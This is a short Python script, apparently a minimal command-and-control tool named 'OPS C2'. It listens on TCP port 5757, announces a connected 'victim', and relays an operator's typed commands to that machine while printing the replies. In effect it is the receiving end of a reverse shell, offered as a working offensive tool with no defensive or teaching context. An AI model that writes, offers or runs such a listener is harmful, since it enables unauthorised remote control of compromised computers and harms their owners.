import subprocess, socket, threading, sys

# ANSI escape codes for text formatting
BOLD = "\033[1m"
RESET = "\033[0m"
BLUE = "\033[34m"
GREEN = "\033[32m"

# Define your ASCII art banner
banner = r"""

 ██████╗ ██████╗ ███████╗     ██████╗██████╗ 
██╔═══██╗██╔══██╗██╔════╝    ██╔════╝╚════██╗
██║   ██║██████╔╝███████╗    ██║      █████╔╝
██║   ██║██╔═══╝ ╚════██║    ██║     ██╔═══╝ 
╚██████╔╝██║     ███████║    ╚██████╗███████╗
 ╚═════╝ ╚═╝     ╚══════╝     ╚═════╝╚══════╝
                                        v1.0
"""

# Function to handle data from the client
def handle_client(client_socket, client_addr):
    print(f"{BOLD}{GREEN}[+] Victim Connected on{RESET} {client_addr[0]}:{client_addr[1]}")
    while True:
        # Receive data from the client
        data = client_socket.recv(1024).decode('utf-8')
        if not data:
            break

        # Display received data
        print(data, end='')

        # Read user input and send it to the client
        user_input = input()
        client_socket.send(user_input.encode('utf-8') + b'\n')

    client_socket.close()

# Main function
def main():
    print(banner)

    # Create a socket to listen for incoming connections
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 5757))
    server.listen(1)  # Listen for one connection

    print(f"{BOLD}{BLUE}[*] Waiting for a connection...")
    client, addr = server.accept()

    # Start a thread to handle communication with the client
    client_handler = threading.Thread(target=handle_client, args=(client, addr))
    client_handler.start()

if __name__ == "__main__":
    main()
